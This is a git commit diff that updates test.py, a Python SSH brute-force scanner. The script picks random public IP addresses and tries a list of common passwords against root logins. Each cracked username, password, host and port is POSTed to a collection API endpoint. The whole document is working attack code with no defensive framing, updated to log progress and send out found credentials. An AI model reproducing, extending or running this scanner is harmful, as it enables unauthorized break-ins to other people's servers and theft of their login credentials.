aa7df66e87e7a0ffc0a571386d7c81415ccec312
Sh4dowX <h4cxor@your.site>
2018-08-13 07:01:18 +0200

    Test-v0.2: Ready

--- test.py
+++ test.py
@@ -6,8 +6,9 @@ import requests
 from pexpect import pxssh
 from threading import Thread
 
-URL   = '127.0.0.1' # Requests
+URL   = 'http://127.0.0.1:8000/api/add/' # Requests
 FILE  = 'top120ssh.txt' # Requests
+Fail  = False
 Found = False
 Words = [i for i in range(10)]
 
@@ -16,36 +17,58 @@ def randomTarget():
     l = []
     for i in range(4):
         if i != 3:
-            l.append(random.randint(0, 255))
+            l.append(str(random.randint(0, 255)))
         else:
-            l.append(random.randint(1, 255))
+            l.append(str(random.randint(1, 255)))
     return '.'.join(l)
 
 def sshCr4cker(i, P, U='root', p=22):
 
+    global Fail
     s = pxssh.pxssh()
     try:
         s.login(i, U, P, port=p)
+        print("[SUCCESS] {0}/{1}@{2}:{3}".format(U, P, i, p))
+        s.logout()
         return U, P, i, p
-    except:
+    except Exception as e:
+        print("[FAIL] Exception: {0}".format(e))
+        if 'read_nonblocking' in str(e):
+            Fail = True
+        elif 'could not set shell prompt' in str(e):
+            Fail = True
         return None
 
 def main():
 
     while True:
 
+        Fail = False
         U = 'root'
-        P = open(FILE, 'r')
+        F = open(FILE, 'r')
         i = randomTarget()
+        if i.startswith('192.168.') or i.startswith('127.') or i.startswith('10.') or i.startswith('0.'):
+            continue
+        i = '192.168.28.128' # ForTest
+        print("[TARGET] {0}".format(i))
         p = 22
-        for x in P.readlines():
+        for x in F.readlines():
+            if Fail:
+                break
             x = x.rstrip('\r').rstrip('\n')
+            print("[TEST] Password {0}".format(x))
             cr4ck = sshCr4cker(i, x, U=U, p=p)
             if cr4ck:
                 U, P, i, p = cr4ck
-                r = requests.post(URL, )
-                break
-        P.close()
+                try:
+                    r = requests.post(URL, data={"U":U, "P":P, "i":i, "p":p})
+                    print(r.text)
+                except Exception as e:
+                    # TODO//SAVE DATA
+                    print("[POST] Exception: {0}".format(e))
+                finally:
+                    break
+        F.close()
 
 if __name__ == '__main__':
     main()
